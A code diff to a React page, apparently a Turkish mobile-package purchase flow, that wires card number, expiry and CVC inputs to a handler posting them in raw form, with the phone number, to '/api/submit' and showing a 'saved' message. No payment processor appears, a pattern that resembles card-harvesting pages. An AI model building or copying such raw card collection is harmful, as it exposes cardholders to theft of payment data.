@@ -1,9 +1,13 @@
 import React, { useState } from 'react'
+import axios from 'axios'
 
 const Index = () => {
   const [step, setStep] = useState(1)
   const [phoneNumber, setPhoneNumber] = useState('')
   const [selectedPackage, setSelectedPackage] = useState(null)
+  const [cardNumber, setCardNumber] = useState('')
+  const [expiry, setExpiry] = useState('')
+  const [cvc, setCvc] = useState('')
 
   const handleContinue = () => {
     setStep(step + 1)
@@ -20,6 +24,21 @@ const Index = () => {
   const handlePackageSelect = (index) => {
     setSelectedPackage(index)
     handleContinue()
+  }
+
+  const handleSubmit = async () => {
+    try {
+      await axios.post('/api/submit', {
+        phoneNumber: phoneNumber,
+        cardNumber: cardNumber,
+        expiry: expiry,
+        cvc: cvc,
+      })
+      alert('Başarıyla kaydedildi!')
+    } catch (error) {
+      console.error(error)
+      alert('Bir hata oluştu.')
+    }
   }
 
   const packages = [
@@ -224,17 +243,23 @@ const Index = () => {
                   type="text"
                   className="border border-gray-300 p-2 w-full mb-2"
                   placeholder="4321 1232 131"
+                  value={cardNumber}
+                  onChange={(e) => setCardNumber(e.target.value)}
                 />
                 <div className="flex justify-between mb-4">
                   <input
                     type="text"
                     className="border border-gray-300 p-2 w-1/2 mr-2"
                     placeholder="Son Kullanma Tarihi"
+                    value={expiry}
+                    onChange={(e) => setExpiry(e.target.value)}
                   />
                   <input
                     type="text"
                     className="border border-gray-300 p-2 w-1/2 ml-2"
                     placeholder="CVV"
+                    value={cvc}
+                    onChange={(e) => setCvc(e.target.value)}
                   />
                 </div>
                 <hr className="mb-4" />
@@ -251,7 +276,10 @@ const Index = () => {
                     okudum, onaylıyorum
                   </span>
                 </div>
-                <button className="bg-red-600 text-white justify-center py-2 px-4 rounded mt-4">
+                <button
+                  className="bg-red-600 text-white justify-center py-2 px-4 rounded mt-4"
+                  onClick={handleSubmit}
+                >
                   Paketi Satın Al
                 </button>
               </div>
